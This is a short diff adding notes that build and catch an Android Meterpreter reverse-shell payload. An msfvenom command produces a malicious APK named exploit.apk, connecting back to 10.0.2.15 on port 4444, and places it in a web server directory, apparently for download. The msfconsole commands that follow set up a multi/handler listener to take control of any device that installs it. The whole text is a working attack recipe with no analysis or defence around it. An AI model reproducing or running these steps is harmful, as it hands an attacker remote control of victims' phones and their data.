@@ -1,0 +1,10 @@
+Payload  app generation:
+msfvenom -p android/meterpreter/reverse_tcp Lhost=10.0.2.15 lport=4444 R> /var/www/html/exploit.apk
+
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+show options
+set lhost 10.0.2.15
+set lport 4444
+exploit
